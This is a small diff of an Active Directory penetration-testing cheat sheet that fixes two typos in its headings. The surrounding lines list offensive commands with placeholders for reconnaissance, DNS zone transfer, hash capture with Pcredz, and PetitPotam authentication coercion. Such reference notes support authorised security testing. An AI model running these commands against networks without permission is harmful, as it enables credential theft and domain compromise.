@@ -14,7 +14,7 @@
 - `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>`
 - `nmap -p 88 --open <ip_range>`
 
-## Zone transfert
+## Zone transfer
 - `dig axfr <domain_name> @<name_server>`
 
 ## Anonymous & Guest access on SMB shares
@@ -48,7 +48,7 @@
     - `Pcredz -i <interface> -v` >>> Hash found ASREQ
 
 ## Coerce >>> Coerce SMB
-- Unauthent PetitPotam (CVE-2022-26925) @CVE@
+- Unauthenticated PetitPotam (CVE-2022-26925) @CVE@
   - `petitpotam.py -d <domain> <listener> <target>`
 
 ## PXE
